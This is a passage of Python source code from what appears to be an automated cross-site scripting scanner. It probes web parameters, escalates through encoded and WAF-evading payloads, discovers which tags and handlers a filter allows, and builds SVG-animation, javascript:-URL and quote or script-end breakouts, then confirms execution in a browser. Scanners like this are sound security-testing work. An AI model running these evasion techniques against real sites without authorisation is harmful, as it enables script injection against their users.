                self._log(f"angular  {param}  ng-app compiled the payload", "info")
            else:
                ng.verified_by = "static"
                ng.notes.append(
                    "angular template injection: compiler present, no dialog observed"
                )
                self._log(
                    f"angular  {param}  ng-app compiler present (static)", "info"
                )
            async with lock:
                self._add(result, ng)
            return

        # 6) Escalation ladder
        found = await self._attempt_ladder(
            client, target, param, result, ctx, filters, uid, lock
        )

        if not found and context == InjectionContext.HTML_ATTR_HREF:
            # A URL attribute is trivially "vulnerable" on paper: any
            # ``javascript:`` value in an ``href`` whose other characters pass
            # is reported by the reflection oracle. Whether it *runs* depends on
            # the element, and a canonical link or a preload is never clicked —
            # so the ladder's verdict is a lead here, not a result. The opposite
            # move reaches the same interpreter: leave the URL grammar and
            # declare a handler on the element that carries the attribute, which
            # a shortcut can activate on an element that cannot be clicked.
            found = await self._scan_href_context(
                client, target, param, result, lock
            ) or found

        if not found:
            # The markup ladder exhausted this parameter. The page may still
            # carry it to a sink from its own script — an encoded reflection
            # says nothing about a value that a script reads from the URL and
            # writes into ``document.write`` or ``innerHTML``. That is DOM XSS
            # and it is decided from the script, not from the echo.
            dom = await self._dom_flow_finding(
                client, target, param, response_body, result, lock
            )
            if dom:
                self._log(f"dom    {param}  parameter reaches a sink via script", "info")
                return
            summary = BlockDiagnosis(
                reason=(
                    BlockReason.FILTERED_PAYLOAD
                    if char_probe.reflected
                    else BlockReason.NO_REFLECTION
                ),
                status=st,
                detail=(
                    f"param={param} context={context.value} "
                    f"filters={[f.value for f in filters]}"
                ),
                surviving_chars=sorted(char_probe.allowed_chars),
                blocked_chars=sorted(char_probe.blocked_chars),
                signals=[f.value for f in filters],
                suggestion=diag.suggestion,
            )
            async with lock:
                result.diagnoses.append(summary)
            self._log(
                f"blocked  {param}  ctx={context.value}  "
                f"filters={','.join(f.value for f in filters)}",
                "warn",
            )

    async def _attempt_ladder(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        result: ScanResult,
        ctx: ContextAnalysis,
        filters: List[FilterType],
        uid: str,
        lock: asyncio.Lock,
    ) -> bool:
        """Try base payloads, then encoding layers, then a WAF profile."""
        marker = make_marker(uid)
        limit = max(4, self.config.max_payloads_per_param)
        # Generate a wide pool and trim after the survival filter: the generator
        # orders by generic robustness, which puts markup-heavy payloads first.
        # On a target that encodes "<" those are all unusable, and a short limit
        # would leave the ladder with nothing but the two tag-less templates.
        pool = max(limit * 4, 24)

        stages: List[Tuple[str, List[str]]] = [
            (
                "base",
                generate_payloads(
                    ctx.context,
                    filters,
                    char_probe=ctx.char_probe,
                    aggressive=self.config.aggressive,
                    limit=pool,
                    marker=marker,
                    quote_char=ctx.quote_char,
                ),
            )
        ]

        blocked = set(filters) & _ENCODING_FILTERS
        if blocked and self.config.encoding_strategies:
            for level in (1, 2):
                stages.append(
                    (
                        f"encode-L{level}",
                        generate_payloads(
                            ctx.context,
                            filters,
                            char_probe=ctx.char_probe,
                            aggressive=self.config.aggressive,
                            limit=max(4, limit // 2),
                            marker=marker,
                            quote_char=ctx.quote_char,
                            encoding_level=level,
                        ),
                    )
                )

        if set(filters) & _WAF_FILTERS or FilterType.WAF_GENERIC in filters:
            waf_payloads = get_waf_payloads(filters)
            if waf_payloads:
                stages.append(
                    (
                        "waf-profile",
                        generate_payloads(
                            ctx.context,
                            filters,
                            aggressive=True,
                            limit=max(6, limit // 2),
                            marker=marker,
                            quote_char=ctx.quote_char,
                            waf_payloads=waf_payloads,
                        ),
                    )
                )

        tried_in_browser = False
        found_anything = False

        for stage_name, payloads in stages:
            if not payloads:
                continue
            # Drop candidates the measured character set rules out *before*
            # spending a request on them: a payload containing an encoded or
            # blocked character cannot execute, and sending it first only to
            # see it reflect buries the viable candidates behind it.
            payloads = _viable_candidates(payloads, ctx, limit=limit)
            if not payloads:
                continue
            if stage_name != "base":
                self._log(f"escalate {param} -> {stage_name}", "info")
            for payload in payloads:
                out = await self._probe_payload(
                    client, target, param, payload, ctx, filters
                )
                result.stats.payloads_sent += 1
                async with lock:
                    result.outcomes.append(out)

                if not (out.success and out.finding):
                    continue

                finding = out.finding
                browser_ok = self.config.use_browser and self.browser.available
                if not finding.browser_confirmed and browser_ok and not tried_in_browser:
                    # First reflection on this parameter: run the whole ladder
                    # in the browser once. The reflection oracle accepts
                    # JS-only breakouts that a browser rejects inside a live
                    # handler, so the primary payload is a lead, not a verdict.
                    tried_in_browser = True
                    finding.payload_candidates = [
                        p
                        for p in _viable_candidates(payloads, ctx)
                        if p != finding.payload
                    ]
                    if ctx.context != InjectionContext.HTML_ATTR_HREF:
                        await self._confirm_with_browser(finding, ctx, marker)

                async with lock:
                    if self._add(result, finding):
                        found_anything = True
                        self._report_finding(finding, ctx)

                if self.config.aggressive:
                    continue
                if not browser_ok:
                    return True
                if finding.browser_confirmed:
                    return True
                if ctx.context == InjectionContext.HTML_ATTR_HREF:
                    # A URL attribute is "vulnerable" on paper: any
                    # ``javascript:`` in an href whose other characters pass is
                    # reported by the reflection oracle. Whether it *runs*
                    # depends on the element, and a canonical link or a preload
                    # is never clicked — so the ladder's verdict is a lead here,
                    # not a result. The handler route reaches the same
                    # interpreter from an element that activates itself, and it
                    # is tried before the scheme candidates are spent on
                    # confirmations: the browser budget is what decides whether
                    # the decisive payload ever gets a turn.
                    if await self._scan_href_context(client, target, param, result, lock):
                        return True
                    await self._confirm_with_browser(finding, ctx, marker)
                # A lead with no execution anywhere in the ladder: the rest of
                # the bank would only repeat the same technique, so stop
                # instead of spending requests on it.
                return found_anything

        # Nothing in the bank survived. If the responses show that markup is
        # reaching the page (an allowlist, not escaping), learn *which* tags and
        # handlers this target permits instead of guessing: filters are always
        # incomplete against elements their author did not have in mind.
        if not found_anything:
            learned = await self._escalate_allowlist(
                client, target, param, result, ctx, filters, marker, limit, lock
            )
            if learned:
                return True
        return found_anything

    async def _escalate_allowlist(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        result: ScanResult,
        ctx: ContextAnalysis,
        filters: List[FilterType],
        marker: str,
        limit: int,
        lock: asyncio.Lock,
    ) -> bool:
        """Discover which markup a filtering target accepts, then use it.

        The payload bank assumes either "everything passes" or "characters are
        encoded". A target that runs an allowlist is neither: ``<img>`` is
        removed while ``<math>`` passes untouched, and an event handler the
        blocklist has never heard of runs fine. Guessing which list is in play
        costs requests and mostly guesses wrong, so the list is *asked for*:
        one probe per tag and per handler, kept only when the exact string comes
        back. The combination that survives is assembled with the marker and
        handed to the ordinary confirmation path.
        """
        tag = self._allowlist_tags or await self._learn_surviving_tag(
            client, target, param, result, lock
        )
        if not tag:
            return False
        handler = await self._learn_surviving_handler(
            client, target, param, result, ctx, tag, marker, lock
        )
        if not handler:
            self._log(f"allowlist {param}: <{tag}> passes, no handler does", "info")
            # A filter that vets event names usually vets ``href`` the same way.
            # SVG animation sidesteps both: ``attributeName``/``values`` are
            # harmless-looking attributes, and the animator writes the scheme in
            # only after the filter has already finished with the markup.
            if await self._escalate_animated_attr(
                client, target, param, result, ctx, filters, marker, limit, lock
            ):
                return True
            return False
        self._allowlist_tags = tag
        self._allowlist_handler = handler

        for payload in _allowlist_payloads(tag, handler, marker, ctx):
            out = await self._probe_payload(client, target, param, payload, ctx, filters)
            result.stats.payloads_sent += 1
            async with lock:
                result.outcomes.append(out)
            if not (out.success and out.finding):
                continue
            finding = out.finding
            # The ladder is handed over as candidates so every learned variant
            # is refuted in order: whichever handler the page can actually fire
            # is not necessarily the first one assembled.
            finding.payload_candidates = [
                p
                for p in _allowlist_payloads(tag, handler, marker, ctx)
                if p != payload
            ][:limit]
            await self._confirm_with_browser(finding, ctx, marker)
            async with lock:
                added = self._add(result, finding)
                if added:
                    self._report_finding(finding, ctx)
            if added or finding.browser_confirmed:
                return True
        return False

    async def _escalate_animated_attr(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        result: ScanResult,
        ctx: ContextAnalysis,
        filters: List[FilterType],
        marker: str,
        limit: int,
        lock: asyncio.Lock,
    ) -> bool:
        """Use SVG animation when every handler and ``href`` is filtered out.

        The filter judges attribute *names*: ``onbegin`` is removed and
        ``href`` is removed, while ``attributeName`` and ``values`` pass
        untouched. ``<animate attributeName=href values=javascript:…>`` is
        therefore a complete link once the animator runs — and the markup never
        contains a handler or an ``href`` for the filter to see.
        """
        candidates = _allowlist_attr_payloads(marker)
        probed = 0
        for payload in candidates:
            out = await self._probe_payload(client, target, param, payload, ctx, filters)
            result.stats.payloads_sent += 1
            async with lock:
                result.outcomes.append(out)
            if not (out.success and out.finding):
                continue
            finding = out.finding
            self._log(f"allowlist {param}: animated href survived", "info")
            finding.payload_candidates = [p for p in candidates if p != payload][:limit]
            await self._confirm_with_browser(finding, ctx, marker)
            async with lock:
                added = self._add(result, finding)
                if added:
                    self._report_finding(finding, ctx)
            if added or finding.browser_confirmed:
                return True
            probed += 1
            if probed >= 2:
                break
        return False

    async def _learn_surviving_tag(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        result: ScanResult,
        lock: asyncio.Lock,
    ) -> str:
        """First element name the filter lets through verbatim.

        A tag that comes back unchanged is a tag the page will build. Two
        answers end the probe early: one that survives (use it) and one that
        proves markup is not merely escaped (a rejected request, or an escaped
        echo) — in which case there is no allowlist to learn from and the
        caller must not keep guessing.
        """
        for name in _TAG_CANDIDATES:
            probe = f"<{name} ixptag=1>x</{name}>"
            st, body, _h, _f = await self._inject(client, target, param, probe)
            result.stats.requests += 1
            if st == 0 or not body:
                continue
            if probe in body:
                self._log(f"allowlist {param}: <{name}> accepted", "info")
                return name
            if html.escape(probe) in body:
                # Characters are encoded here: allowlist discovery has nothing
                # to work with, and the character probe already covers it.
                return ""
            if st >= 400:
                # Rejected outright: this target filters rather than encodes,
                # keep walking the tag list.
                continue
        return ""

    async def _learn_surviving_handler(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        result: ScanResult,
        ctx: ContextAnalysis,
        tag: str,
        marker: str,
        lock: asyncio.Lock,
    ) -> str:
        """First event handler the target lets through inside *tag*."""
        if self._allowlist_handler:
            return self._allowlist_handler
        for event in _EVENT_CANDIDATES:
            if event in _NESTED_ANIMATOR_EVENTS and tag not in _SVG_ANIMATORS:
                # An animation event declared on a container is not the thing
                # the filter is vetting: probe the animator itself, nested so
                # the parser keeps it, and let the payload builder wrap it.
                for child in _SVG_ANIMATORS:
                    probe = f"<svg><{child} ixp{marker} {event}=alert(1)></svg>"
                    st, body, _h, _f = await self._inject(
                        client, target, param, probe
                    )
                    result.stats.requests += 1
                    if st == 0 or not body:
                        continue
                    if probe in body:
                        self._log(
                            f"allowlist {param}: handler {event} accepted "
                            f"on <{child}>",
                            "info",
                        )
                        return event
                continue
            probe = f"<{tag} ixp{marker} {event}=alert(1)>"
            st, body, _h, _f = await self._inject(client, target, param, probe)
            result.stats.requests += 1
            if st == 0 or not body:
                continue
            if probe in body:
                self._log(f"allowlist {param}: handler {event} accepted", "info")
                return event
            if st >= 400:
                # The filter rejected the whole request: keep walking the list.
                continue
        return ""

    async def _probe_payload(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        payload: str,
        ctx: ContextAnalysis,
        filters: List[FilterType],
    ) -> ProbeOutcome:
        st, body, hdrs, final_url = await self._inject(client, target, param, payload)
        out = evaluate_response(
            url=final_url or target.url,
            param=param,
            method=target.method,
            payload=payload,
            status=st,
            body=body,
            headers=hdrs,
            context=ctx.context,
            filters=filters,
        )
        if out.finding:
            out.finding.waf = next(
                (f.label for f in filters if f.value.startswith("waf_")), ""
            )
            out.finding.marker = mark_of(payload)
            out.finding.notes.append(f"encoding_layer={out.decoding_layer}")
            # The body the scanner itself assembled, so the report can replay
            # it. A GET has none, and a body mixing in a per-session token is
            # still recorded - ``reproduce_command`` says what to replace.
            if target.method.upper() != "GET" and target.data:
                out.finding.request_body = dict(target.data)
            if ctx.tag_name:
                out.finding.notes.append(
                    f"injected inside <{ctx.tag_name}"
                    + (f" {ctx.attr_name}" if ctx.attr_name else "")
                    + ">"
                )
        return out

    async def _inject(
        self, client: HttpClient, target: ScanTarget, param: str, value: str
    ):
        st, body, headers, final = await client.inject(
            target.url,
            param,
            value,
            method=target.method,
            base_data=target.data,
        )
        if (
            st < 400
            or "://" in value
            or value.startswith(("http", "//"))
            # A whole-record validator rejects on a *required* sibling field,
            # and no shape of this value will change that. Retrying there is a
            # second request, and on a slow handler it is the whole budget of
            # the parameter — the ladder then never gets to run. Diagnostic
            # values stay unwrapped: on a POST only a wrapped (scheme-shaped)
            # value should be retried, and only when the handler answers 2xx
            # to a well-formed record.
            or target.method.upper() != "GET"
            or not _INJECTABLE_PROBE.match(value)
        ):
            return st, body, headers, final
        # A field with its own validator (a "Website" input, an avatar URL) does
        # not reject the characters — it rejects the *shape*. The sink is still
        # behind it, so the value is re-sent inside a URL: the payload survives
        # verbatim and the field accepts that it is a link.
        wrapped = _URL_SHAPE.format(value=value)
        st2, body2, headers2, final2 = await client.inject(
            target.url,
            param,
            wrapped,
            method=target.method,
            base_data=target.data,
        )
        # Whatever the retry answered is the field's answer: a field that
        # accepts the wrapped value is reachable, and reporting the original 400
        # would make the caller abandon a parameter the target just stored.
        if st2:
            return st2, body2, headers2, final2
        return st, body, headers, final

    async def _measure_chars_at(
        self,
        client: HttpClient,
        target: ScanTarget,
        param: str,
        uid: str,
        canary_body: str,
        probe_body: str,
        canary: str,
        probe: str,
        hit,
        result=None,
    ) -> Dict[str, str]:
        """Measure metacharacter survival at the chosen injection point.
        Only the characters that decide the payload shape are probed: the
        delimiter that would close the context plus the characters a breakout
        needs. Each is sent alone so a surviving delimiter cannot destroy the
        region before it is read.

        The echo is addressed by *rank*, not by offset: a probe request produces
        its own document, and the injection point of interest is the one at the
        same position in the list of reflections as the canary echo we chose.
        When the rank count differs, the value changed the parse tree and the
        measurement is skipped rather than attributed to the wrong echo.
        """
        needed = _chars_that_matter(hit.context, hit)
        if not needed:
            return {}
        rank = _reflection_rank(canary_body, canary, hit.chosen_pos)
        if rank is None:
            return {}
        verdicts: Dict[str, str] = {}
        for ch in needed:
            payload = single_char_probe(uid, ch)
            _st, body, _hdrs, _fin = await self._inject(client, target, param, payload)
            if result is not None:
                result.stats.requests += 1
            anchor = _nth_occurrence(body or "", f"S{uid}A", rank)
            verdict = measure_single_char(param, uid, ch, body or "", anchor)
            verdicts[ch] = verdict
        return verdicts

    # ------------------------------------------------------------------
    # fragment / DOM
    # ------------------------------------------------------------------

    async def _scan_fragment(
        self,
        client: HttpClient,
        target: ScanTarget,
        result: ScanResult,
        lock: asyncio.Lock,
    ) -> None:
        # DOM XSS lives in the script that reads the fragment, which portals
        # frequently keep in a framed document. Analyse the page that actually
        # holds the hash→sink flow, not only the wrapper.
        pages = [target.url]
        framed = f"{target.url.rstrip('/')}/frame"
        if framed not in pages:
            pages.append(framed)

        st = body = None
        analysed_url = target.url
        finding = None
        for url in pages:
            st, body, _, final_url = await client.inject(url, "#fragment", "1", method="GET")
            result.stats.requests += 1
            if not (st and body):
                continue
            analysed_url = final_url or url
            finding = fragment_dom_finding(
                analysed_url, body, marker=make_marker(str(id(target))[-8:])
            )
            if finding:
                break

        if not finding:
            async with lock:
                result.diagnoses.append(
                    BlockDiagnosis(
                        reason=BlockReason.NO_REFLECTION,
                        status=st or 0,
                        detail=f"fragment on {target.url} — no hash-to-sink pattern",
                    )
                )
            return

        await self._confirm_with_browser(finding, ContextAnalysis(
            context=InjectionContext.URL_FRAGMENT
        ))
        if not finding.browser_confirmed:
            finding.evidence += " | static_dom_only"
            finding.verified_by = "static"
            finding.confidence = min(finding.confidence, 0.8)

        async with lock:
            if self._add(result, finding):
                self._report_finding(finding, ContextAnalysis(context=InjectionContext.URL_FRAGMENT))

    # ------------------------------------------------------------------
    # browser confirmation
    # ------------------------------------------------------------------

    async def _confirm_with_browser(
        self, finding: XSSFinding, ctx: ContextAnalysis, marker: str = ""
    ) -> None:
        if not self.config.use_browser or not self.browser.available:
            return
        if finding.method.upper() != "GET" or not finding.url:
            return

        marker = marker or finding.marker or mark_of(finding.payload)
        base = finding.url.split("#")[0]
        # Fragment payloads are refuted in order: a gadget loader takes a script
        # URL, not markup, so the optimistic candidate rarely fires first.
        candidates: List[str] = []
        for payload in [finding.payload] + list(finding.payload_candidates or []):
            # A candidate without the marker cannot prove it executed: any
            # dialog on the page would be accepted, and a payload that breaks
            # the document (a broken handler) can wedge the page instead.
            if payload and mark_of(payload) and payload not in candidates:
                candidates.append(payload)
        if finding.payload not in candidates:
            candidates.insert(0, finding.payload)
        # The ladder can produce several payloads for the same sink. Each one
        # costs a page load, and a page with a hanging sub-resource makes that
        # load wait out the whole browser timeout — four of them are minutes of
        # the scan's budget spent on a sink that was already answered. The
        # first candidates are the ones the echo evidence ranked highest, so a
        # short list is the better trade.
        candidates = candidates[:3]

        br = None
        is_fragment = ctx.context == InjectionContext.URL_FRAGMENT
        # ``#fragment`` is the *name* of a pseudo-parameter invented for the URL
        # hash. A finding attributed to it is delivered as a fragment; a finding
        # for a real parameter that the page's own script reads must be
        # delivered into that parameter, not appended as ``#fragment=…`` to a URL
        # that then loses the value the page needs to render at all.
        owns_parameter = bool(finding.parameter) and not _is_fragment_name(
            finding.parameter
        )
        if owns_parameter:
            is_fragment = False
        # Each candidate needs its own URL: the fragment is appended, the query
        # parameter is substituted in the original URL.
        param = finding.parameter

        for payload in candidates:
            if is_fragment:
                url = f"{base}#{payload}"
            else:
                # ``base`` already carries the finding's own payload, so the
                # parameter is replaced rather than appended to an existing copy.
                url = _swap_query_param(base, param, payload, raw="%" in payload)
            # Seeds are per-payload: the source value *is* the payload, so it
            # must be re-derived for every candidate the ladder tries.
            seeds = (
                source_seed(finding.parameter, payload, finding.url)
                if finding.seeds
                else {}
            )
            # ``confirm`` bounds itself from the inside, but a wedged browser
            # never gets that far. The deadline here is what makes one bad page
            # unable to freeze the scan.
            try:
                br = await asyncio.wait_for(
                    self.browser.confirm(
                        url,
                        context_hint=ctx.context.value,
                        payload=payload,
                        marker=marker,
                        **seeds,
                    ),
                    timeout=_CONFIRM_DEADLINE,
                )
            except asyncio.TimeoutError:
                self._log("browser confirm stalled — moving on", "debug")
                break
            if br.confirmed:
                # Adopt the payload that actually fired, not the optimistic one.
                finding.payload = payload
                finding.url = url
                break

        if br is not None and br.confirmed:
            finding.browser_confirmed = True
            finding.verified_by = "browser"
            # A dialog that echoes our unique marker is causal proof; a bare
            # dialog is still evidence but the page may have fired it itself.
            finding.confidence = 0.97 if br.marker_echoed else 0.85
            finding.trigger = br.trigger
            finding.evidence = (
                f"{finding.evidence} | browser:{br.detail}"
                + (f" [{br.dialog_message[:80]}]" if br.dialog_message else "")
            )
            self._log(f"browser CONFIRMED ({br.trigger}: {br.detail})", "vuln")
        else:
            detail = br.detail if br is not None else "no_candidate"
            self._log(f"browser no execution ({detail})", "debug")

    # ------------------------------------------------------------------
    # bookkeeping
    # ------------------------------------------------------------------

    def _add(self, result: ScanResult, finding: XSSFinding) -> bool:
        if not _is_new_finding(result.findings, finding):
            return False
        result.findings.append(finding)
        return True

    def _report_finding(self, finding: XSSFinding, ctx: ContextAnalysis) -> None:
        cvss = finding.cvss
        self._log(
            f"VULN  {finding.verified_label}  {finding.severity.value.upper()} "
            f"cvss={cvss['score']}  {finding.vulnerability_type}  "
            f"param={finding.parameter}  ctx={finding.context.value}",
            "vuln",
        )
        self._log(f"      {finding.url}", "vuln_detail")
        self._log(f"      payload: {finding.payload[:160]}", "vuln_detail")

    def _log(self, msg: str, level: str = "info") -> None:
        # ``silent`` is "findings only", so vuln lines survive it. A stream that
        # must stay machine-readable sets ``mute`` instead, which drops all of it.
        if getattr(self, "_mute", False):
            return
        if self.config.silent and level not in ("vuln", "vuln_detail"):
            return
        if level == "debug" and not self.config.verbose:
            return
        colors = {
            "title": Fore.MAGENTA + Style.BRIGHT,
            "info": Fore.CYAN,
            "warn": Fore.YELLOW,
            "error": Fore.RED,
            "vuln": Fore.GREEN + Style.BRIGHT,
            "vuln_detail": Fore.GREEN,
            "debug": Style.DIM,
        }
        prefix = {
            "title": "[*] ",
            "info": "[+] ",
            "warn": "[!] ",
            "error": "[-] ",
            "vuln": "[>] ",
            "vuln_detail": "    ",
            "debug": "    ",
        }.get(level, "")
        c = colors.get(level, Fore.WHITE)
        print(f"{c}{prefix}{msg}{Style.RESET_ALL}")


# ----------------------------------------------------------------------
# pure helpers
# ----------------------------------------------------------------------


def _uid(seed: str) -> str:
    return hashlib.md5(seed.encode()).hexdigest()[:8]


def _contains(body: str, needle: str) -> bool:
    if not body:
        return False
    return needle in body or needle.lower() in body.lower()


def _attribute_shortcut_payloads(marker: str, quote: str) -> List[str]:
    """Values that leave a URL attribute and declare a handler on its element.

    The value is inside ``href='…'`` (or ``"…"``), so the first quote closes the
    attribute. The handler that follows is called with backticks: any further
    ``'`` / ``"`` would end the attribute again. ``accesskey`` is what makes the
    handler reachable on an element the user never clicks — the canonical link,
    a preload, a stylesheet.

    Both readings of the leftover document are tried. The page's own closing
    quote may become a stray character before ``>``, or it may end the handler
    value itself; only the browser can say which, and a payload that gets it
    wrong is inert rather than wrong.
    """
    call = f"alert(`{marker}`)"
    return [
        f"{quote}accesskey={quote}x{quote}onclick={call}",
        f"{quote}accesskey={quote}x{quote}onclick={quote}{call}",
        f"{quote}accesskey={quote}x{quote}onclick={quote}{call}{quote} x={quote}",
    ]


# The app escapes the quote by prefixing a backslash: a value that already ends
# in exactly one backslash yields ``\\'`` — an even run, so the quote that
# follows closes the literal. Two backslashes become an odd run and stay inert.
_ESCAPE_BREAKOUT = re.compile(r"(?<!\\)\\['\"]")


def _needs_blocked_chars(payload: str, blocked: set, script_escape_blocked: set) -> bool:
    """True when *payload* cannot run because it needs a character that is dead.

    Presence of the character is not the whole question. A breakout consumes a
    quote at the *parser* level: the app encodes ``'`` to ``&#39;``, but the
    payload's own quote is what ends the literal, and the browser then reads the
    encoded ones as data. Only the characters the payload needs as *syntax*
    count, so a form that is a genuine breakout is exempt from the delimiter it
    breaks — the same rule ``_char_filter`` applies.
    """
    problem = script_escape_blocked if "</script" in payload.lower() else blocked
    if not problem:
        return False
    # An interpolation needs no delimiter at all: ``${alert(…)}}`` is evaluated
    # in place inside the template, so a parameter that blocks the quote and
    # both angle brackets still runs it. Judging it by characters it never uses
    # discarded the one payload the context actually accepts.
    if re.search(r"\$\{[^}]*\}", payload):
        return False
    needed = set(payload) & problem
    if not needed:
        return False
    if needed <= {"'", '"'} and (
        _ESCAPE_BREAKOUT.search(payload)
        or re.search(r"""["']\s*>|<[a-zA-Z]""", payload)
        or "accesskey" in payload.lower()
        or re.search(r"\bimport\s*\(", payload)
    ):
        # The quote is the breakout's own delimiter, supplied by the app's
        # encoder; the payload never needed to carry it verbatim.
        return False
    return True


def _viable_candidates(
    payloads: List[str], ctx: ContextAnalysis, limit: int = 8
) -> List[str]:
    """Payloads from *payloads* whose characters can actually survive.

    The character probe measured what this parameter passes through. A
    candidate that needs a blocked character cannot execute no matter how
    faithfully it reflects, so it is dropped instead of spending a browser
    navigation. An *encoded* character is equally unusable inside markup: it
    arrives as ``&lt;``, which the parser reads as text, not as a tag.

    Survivors are ranked by *technique robustness* before order is kept:
    a ``||`` expression needs no closing parenthesis and completes whatever
    literal wraps it, so it outranks a ``');`` breakout on any parameter the
    server may be truncating or the page may be chaining.
    """
    probe = getattr(ctx, "char_probe", None)
    blocked = set(getattr(probe, "blocked_chars", set()) or set()) if probe else set()
    blocked |= set(getattr(probe, "encoded_chars", {}) or {}) if probe else set()
    # ``>`` is not needed by a script-block escape: the parser ends the script
    # at ``</script>`` and the element it opens may stay unclosed until the
    # document ends. A server that escapes ``>`` therefore still has this one
    # route, and requiring the character would discard it.
    script_escape_blocked = blocked - {">"}

    def rank(p: str) -> int:
        # Template interpolation: evaluated in place, needs neither a closing
        # quote nor an angle bracket, so it survives a filter that kills both.
        if re.search(r"\$\{[^}]*\}\s*$", p):
            return -1
        # The escape is the breakout: the app adds its backslash *after*
        # copying the value, so a value ending in one backslash becomes an even
        # run and the quote that follows really ends the literal. Two
        # backslashes become an odd run and stay inert, so this ranks only the
        # one-backslash form.
        if _ESCAPE_BREAKOUT.search(p):
            return -1
        # Ending the script block escapes the JS string wherever the quote was
        # escaped, so it is the only form that reaches the parser on a server
        # that backslash-escapes quotes. It must not be buried under the plain
        # quote breakouts, which that same escaping makes inert.
        if "</script" in p.lower():
            return 0
        # Comma expression that re-opens the literal: the enclosing call stays
        # valid and our code runs beside it.
        if re.search(
            r"""["']\s*,\s*(?:alert|prompt|confirm)\s*\([^)]*\)\s*,\s*["']""", p, re.I
        ):
            return 0
        # Same technique, shorter tail.
        if re.search(
            r"""["']\s*,\s*(?:alert|prompt|confirm)\s*(?:\(|`)""", p, re.I
        ):
            return 1
        # Short-circuit: needs no closing parenthesis.
        if re.search(r"(?:\|\||&&)\s*(?:alert|prompt|confirm)", p, re.I):
            return 2
        # Module import: an execution primitive that carries no ``alert``, no
        # ``<``, no ``>`` and no backtick. Where a lab encodes all of those and
        # escapes the quote, it is the only form that still reaches code.
        if re.search(r"\bimport\s*\(", p):
            return 2
        # Element or attribute breakout.
        if re.search(r"""["']\s*>|<[a-zA-Z]""", p):
            return 3
        # Anything else that at least carries a call.
        if re.search(r"(?:alert|prompt|confirm)\s*(?:\(|`)", p, re.I):
            return 4
        return 5

    viable = [
        p
        for p in payloads
        if not _needs_blocked_chars(p, blocked, script_escape_blocked)
    ]
    survivor_sorted = sorted(viable, key=rank)  # stable within a rank
    # Every rank class exists because the parameter may be handled in a way the
    # previous one cannot survive. Spending all the slots inside the first class
    # therefore means a class that is *the* answer here is never tried — a page
    # that escapes the quote has no use for the plain-quote breakouts, and the
    # next slot is gone. The head of the list is a spread over the distinct
    # techniques, in rank order; the remainder fills the budget as before.
    ordered: List[str] = []
    seen_ranks: set = set()

    def technique(p: str) -> str:
        """Group key: two values that only differ in decoration share a key."""
        if "accesskey" in p.lower():
            return "shortcut"
        if re.search(r"\$\{[^}]*\}", p):
            # Interpolation: the template evaluates it in place.
            return "interpolation"
        if "javascript:" in p.lower() or "data:" in p.lower():
            return "url"
        if re.search(r"\bimport\s*\(", p):
            # Needs no ``alert``: the module request is the proof that the code
            # ran, and it survives the encodings that disarm the other forms.
            return "import"
        if _ESCAPE_BREAKOUT.search(p):
            return "backslash"
        if "</script" in p.lower():
            return "script_end"
        if re.search(r"\|{2}|&&", p):
            return "short_circuit"
        if re.search(r"""["']\s*,\s*(?:alert|prompt|confirm)""", p, re.I):
            return "comma"
        if re.search(r"""["']\s*>|<[a-zA-Z]""", p):
            return "markup"
        if "atob" in p or "fromCharCode" in p:
            return "obfuscated"
        if re.search(r"""["']\s*[-(]""", p):
            return "quote"
        return "bare"

    for p in survivor_sorted:
        key = technique(p)
        if key in seen_ranks:
            continue
        seen_ranks.add(key)
        ordered.append(p)
        if len(ordered) >= limit:
            break
    for p in survivor_sorted:
        if len(ordered) >= limit:
            break
        if p not in ordered:
            ordered.append(p)
    return ordered[:limit]


def _js_string_open_at(js: str, value: str) -> str:
    """Return the quote of the JS string literal open where *value* starts.

    ``""`` means the value sits in code rather than in a string. A backslash
    escape inside a string is honoured, so ``'it\\'s'`` does not terminate it.
    """
    pos = js.find(value)
    if pos < 0:
        return ""
    open_quote = ""
    i = 0
    while i < pos:
        ch = js[i]
        if open_quote:
            if ch == "\\":
                i += 2
                continue
            if ch == open_quote:
                open_quote = ""
        elif ch in ("'", '"', "`"):
            open_quote = ch
        i += 1
    return open_quote


def _js_url_payload(marker: str, js_quote: str, prefix: str = "") -> str:
    """Break out of the string *js_quote* inside a ``javascript:`` URL.

    The page's own call is ``fetch('/x', {body:'VALUE'}).finally(…)``. Closing
    the string and the object literal leaves a statement position inside the
    argument list, and three things must then be true at once for the value to
    reach ``alert``:

    * the breakout survives the server-side filter, which anchors on ``&'``
      (a bare quote is rejected) and forbids a literal space (``/**/`` is used);
    * the exception path carries our marker into ``onerror``, which is called
      with the thrown value as its first argument — hence ``throw`` with a
      keyword argument, not a plain call;
    * the string and object are re-opened at the end so the page's own
      ``}).finally(…)`` stays syntactically valid and the link still renders.

    The payload keeps its dangerous characters percent-encoded (``=``, ``'``,
    ``+``): this filter inspects the raw query before URL-decoding, so the only
    form it accepts is the encoded one, and the browser decodes it a second time
    when it evaluates the pseudo-URL. ``_swap_query_param`` preserves ``%XX``
    sequences, so they arrive exactly as written here.
    """
    q = "%27" if js_quote != '"' else "%22"
    lit = f"{q}{marker}{q}"
    # *prefix* is the value the page already accepted (its own id shape); the
    # ``&'`` sequence is what the filter permits as a quote opener.
    head = f"{prefix}&'" if prefix else "&'"
    # window+'' forces a string so the object's overridden toString is reachable;
    # the trailing `,{x:'` re-opens the property so the closing brace balances.
    return (
        f"{head}}},x=x=%3E{{throw/**/onerror=alert,{lit}}},toString=x,"
        f"window%2b{q}{q},{{x:{q}"
    )


def _swap_query_param(
    url: str, param: str, value: str, raw: bool = False
) -> str:
    """Return *url* with query parameter *param* set to *value*, encoded.

    A value that is already percent-encoded — a DOM payload has to carry
    ``%09`` for a tab and ``%22`` for a quote, because the page rebuilds it
    from ``location.search`` — must reach the wire with those bytes intact.
    Re-quoting would turn ``%09`` into ``%2509`` and the payload would arrive
    as literal text.

    ``raw=True`` inserts the value untouched, for a payload that was written
    against a filter reading the *undecoded* query string (a ``javascript:``
    breakout needs ``'``, ``=`` and ``+`` exactly as authored).
    """
    parsed = urlparse(url)
    keep = [
        (k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True) if k != param
    ]
    if raw:
        pairs = [f"{quote(k, safe='')}={v}" for k, v in keep]
        pairs.append(f"{quote(param, safe='')}={value}")
